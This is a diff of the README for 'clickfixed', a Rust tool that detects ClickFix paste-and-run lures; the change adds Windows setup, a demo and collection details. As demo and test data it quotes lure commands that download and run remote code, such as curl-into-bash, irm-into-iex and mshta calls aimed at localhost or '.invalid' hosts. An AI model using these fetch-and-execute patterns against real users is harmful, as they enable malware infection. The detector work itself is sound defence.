@@ -5,7 +5,7 @@
 
 Deterministic ClickFix ([MITRE T1204.004](https://attack.mitre.org/techniques/T1204/004/)) detector in Rust. It scores pasted and executed commands with explainable rules, decodes obfuscated commands, and sends alerts to syslog, Jira, Slack or Wazuh.
 
-A ClickFix page tells you to paste a command into a terminal or the Windows Run dialog to "verify you are human". Nothing is exploited or downloaded, so mail filters, browser sandboxes and download reputation never see it, and EDR sees it only after it runs. clickfixed scores the command when the browser writes it to the clipboard, before you paste it.
+A ClickFix page tells you to paste a command into a terminal or the Windows Run dialog to "verify you are human". Nothing is exploited or downloaded, so mail filters, browser sandboxes and download reputation never see it, and EDR sees it only after it runs. clickfixed scores the command when the browser writes it to the clipboard, before you paste it. It runs on Linux and Windows.
 
 > [!WARNING]
 > `corpus/` holds attack command structures for testing. Every payload host is a `.invalid` placeholder (RFC 2606) that never resolves, and nothing in this repo runs corpus content. The engine decodes statically, in memory.
@@ -18,7 +18,7 @@ Signal 2  EXECUTION    exec event → match against clipboard hashes → alert i
 Signal 3  POST-HOC     deep decode (≤5 layers, ≤500 ms) → IOC report (URLs, domains, IPs, paths)
 ```
 
-Each signal runs on its own thread, and none waits on another.
+Each signal runs on its own thread, and none waits on another. On Windows, the clipboard is scored again when the Run dialog or a terminal comes to the front, so a lure pasted into Win+R gets the Run-dialog weighting, and block mode clears it before Ctrl+V.
 
 **Every verdict is a sum you can read.** Each feature is a named rule with a fixed weight in [`rules/default.toml`](crates/cfx-engine/src/rules/default.toml), such as `mshta` with a remote URL, fetch-and-execute, decode-and-execute, a hidden window, or decoy prose like "I am not a robot – Verification ID: 2165". The score is the sum of matched weights, minus allowlist dampening, times a context multiplier (Run dialog ×1.6, unclassified browser origin ×1.3). It warns at 1.0 and blocks at 2.0. Command length, `&&` count and entropy alone are never scored.
 
@@ -42,7 +42,7 @@ Fast-path latency is p50 45 µs and p99 108 µs, against a 5 ms budget.
 
 The reconstructed corpus follows command structure from vendor reporting, not sandbox captures, and I wrote the stress rows for this project. Both test the rules, not field detection rates. Expect false positives on clipboards nobody has tried yet, and please report them. [`docs/EVALUATION.md`](docs/EVALUATION.md) has the method and the change log.
 
-## Setup
+## Setup on Linux
 
 ### Requirements
 
@@ -122,6 +122,50 @@ clickfixed run --config ~/.config/clickfixed/config.toml  # in another terminal
 
 Open `http://127.0.0.1:8765/lure.html` and click "I'm not a robot". The page copies `bash -c "$(curl -fsSL http://127.0.0.1:8765/verify.sh)" # I am not a robot …`, and clickfixed flags it. If you run it anyway, `verify.sh` only prints a message.
 
+## Setup on Windows
+
+Windows 10 or 11. No administrator rights are needed: clickfixed runs as you, because a Windows service can't see your clipboard or which window is in front.
+
+### Install
+
+Download `clickfixed.exe` from the latest [CI run](https://github.com/uday-kasturi/clickfixed/actions/workflows/ci.yml) (artifact `clickfixed-windows-x86_64`), or build it with [Rust](https://rustup.rs) and the Visual Studio C++ build tools:
+
+```powershell
+git clone https://github.com/uday-kasturi/clickfixed.git
+cd clickfixed
+cargo install --locked --path crates/cfx-daemon    # installs clickfixed.exe into ~\.cargo\bin
+clickfixed check 'mshta https://x.invalid/v.mp4 # I am not a robot'
+```
+
+### Configure and run
+
+```powershell
+New-Item -ItemType Directory -Force $env:APPDATA\clickfixed
+Copy-Item clickfixed.example.toml $env:APPDATA\clickfixed\config.toml
+Copy-Item -Recurse templates $env:APPDATA\clickfixed\
+clickfixed run                       # finds %APPDATA%\clickfixed\config.toml on its own
+```
+
+The settings are the same as on Linux. Syslog has no local socket on Windows, so use `transport = "udp"` or `"tcp"`. Put secrets for alert outputs in user environment variables (System Properties → Environment Variables).
+
+To start at login without a console window:
+
+```powershell
+clickfixed autostart enable          # adds a per-user Run entry; `disable` and `status` too
+```
+
+Logs then go to `%LOCALAPPDATA%\clickfixed\clickfixed.log`, next to `alerts.json` and `reports\`. Warnings appear as Windows notifications from a tray icon.
+
+### Try it safely
+
+Run `demo\serve.ps1` (needs Python), open `http://127.0.0.1:8765/lure.html` and click "I'm not a robot". On Windows the page copies `powershell -NoExit -c "irm http://127.0.0.1:8765/verify.ps1 | iex" # I am not a robot …`. clickfixed warns on the copy, and when you press Win+R it scores it again with the Run dialog and blocks. If you run it anyway, `verify.ps1` only prints a message.
+
+### How it collects on Windows
+
+- **Clipboard:** a clipboard listener. The window that owns the clipboard gives the source app, and Chromium and Firefox attach the page URL.
+- **Paste target:** a foreground-window hook spots the Run dialog and terminals (Windows Terminal, PowerShell, cmd and console windows).
+- **Execution:** a process poller, plus the RunMRU registry key, which records every command run from Win+R even if the process exits too fast to poll.
+
 ## Alerting
 
 Every output renders one ECS alert with the score and verdict, each matched rule and its weight, the command's SHA-256 and decoded form, the origin, host, user, and ATT&CK IDs. The alert never carries the raw clipboard text, and password-manager sources are refused. One severity mapping in the config sets the Wazuh level, syslog and CEF severity, Slack colour and Jira priority.
@@ -129,7 +173,7 @@ Every output renders one ECS alert with the score and verdict, each matched rule
 | output | what it does |
 |---|---|
 | stdout, file | ECS JSON lines. Wazuh, Filebeat or the Splunk forwarder can tail the file |
-| syslog | CEF over the local socket, UDP or TCP |
+| syslog | CEF over UDP, TCP or (Linux) the local socket |
 | webhook | POSTs a JSON template: Slack, or anything else you add a template for |
 | Jira | One issue per host and command. Repeats add a comment instead of a new ticket |
 | Wazuh | Decoder and rules in [`wazuh/`](wazuh/), generated from the severity mapping |
@@ -149,7 +193,8 @@ The last line scores your own shell history as extra benign rows. The output sta
 
 ```
 crates/cfx-engine    detection engine, no OS APIs (CI builds it for wasm32 to prove it)
-crates/cfx-collect   Linux collectors: X11 clipboard, /proc or auditd exec events
+crates/cfx-collect   collectors: X11 clipboard and /proc or auditd on Linux; clipboard
+                     listener, foreground hook, process poller and RunMRU on Windows
 crates/cfx-daemon    the clickfixed binary
 crates/cfx-alert     alert schema, severity mapping, outputs
 crates/cfx-eval      evaluation harness and regression tests
@@ -161,21 +206,14 @@ docs/                threat model, evaluation, results, alerting
 
 ## Platform scope
 
-clickfixed is built and tested on Linux. The engine is OS-independent, but most ClickFix victims are on Windows and macOS, and this build doesn't protect them yet. Windows and macOS collectors are designed but not built yet (see [Upcoming](#upcoming)). [`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md) covers what is and isn't in scope.
+clickfixed runs on Linux and Windows. CI builds and tests both on every push. The engine is OS-independent; macOS needs its own collectors (see [Upcoming](#upcoming)). [`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md) covers what is and isn't in scope.
 
 On Wayland, copies from native Wayland apps reach clickfixed through the compositor's clipboard bridge, so their browser origin is lost. The content is still scored.
 
 ## Upcoming
 
-**Windows.** Most ClickFix victims paste into Win+R, so this comes first. The engine already scores Windows lures, so the work is the collectors and the daemon:
-
-- clipboard listener that records which process wrote the clipboard, so browser origin carries over
-- Run dialog and Win+X detection from the foreground window and RunMRU writes
-- process creation events from ETW, or Sysmon Event ID 1 where Sysmon is installed
-- toast notifications, block mode, and a Windows service
-- a `windows-latest` CI job
-
-**macOS** follows, with pasteboard polling and `eslogger` for process events.
+- **macOS:** pasteboard polling for the clipboard and `eslogger` for process events.
+- **Windows, deeper:** ETW or Sysmon Event ID 1 process events, so short-lived processes aren't missed (needs administrator rights), and Win+X menu detection, which counts as a terminal today.
 
 ## License
 
